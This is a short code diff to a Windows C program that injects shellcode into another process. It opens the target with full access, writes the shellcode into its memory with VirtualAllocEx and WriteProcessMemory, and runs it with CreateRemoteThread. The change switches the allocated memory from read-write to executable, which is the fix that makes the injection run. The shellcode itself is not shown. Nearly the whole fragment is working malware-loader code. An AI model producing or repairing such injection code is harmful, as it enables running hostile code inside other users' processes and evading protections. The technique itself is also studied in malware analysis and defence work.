@@ -9,7 +9,7 @@ int main()
 	DWORD ppid = find_process();
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ppid);
 	DWORD dwsize = strlen((const char *)shellcode);
-	LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwsize, MEM_COMMIT, PAGE_READWRITE);
+	LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	WriteProcessMemory(hProcess, pRemoteBuf, shellcode, dwsize, NULL);
 	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf, NULL, 0, NULL);
 	WaitForSingleObject(hThread, INFINITE);
